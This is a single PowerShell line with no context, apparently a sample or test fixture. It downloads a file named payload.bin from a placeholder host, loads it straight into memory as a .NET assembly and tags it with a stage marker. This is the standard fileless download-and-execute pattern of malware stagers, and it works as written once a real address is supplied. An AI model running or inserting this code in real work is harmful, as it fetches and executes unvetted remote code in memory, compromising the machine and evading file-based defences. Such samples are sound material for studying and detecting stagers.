$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('https://example.com/payload.bin'); [Reflection.Assembly]::Load($ManagedBytes); $StageMarker = "stage-12"
